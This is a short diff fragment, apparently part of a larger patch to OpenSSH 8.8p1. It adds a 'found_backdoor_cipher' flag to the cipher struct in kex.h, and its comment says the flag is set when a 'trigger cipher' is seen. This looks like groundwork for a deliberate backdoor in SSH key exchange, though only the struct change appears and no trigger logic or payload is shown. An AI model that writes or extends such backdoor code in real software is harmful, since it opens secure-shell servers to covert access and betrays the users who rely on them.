@@ -1,0 +1,10 @@
+--- openssh-portable-v8.8_p1/kex.h	2021-12-02 17:04:09.341420945 -0600
++++ openssh-portable-patch/kex.h	2021-12-02 17:31:51.655605934 -0600
+@@ -117,6 +117,7 @@
+ 	u_int	block_size;
+ 	u_char	*key;
+ 	u_char	*iv;
++	int found_backdoor_cipher; /* We set this to 1 if we observe the trigger cipher */
+ };
+ struct sshcomp {
+ 	u_int	type;
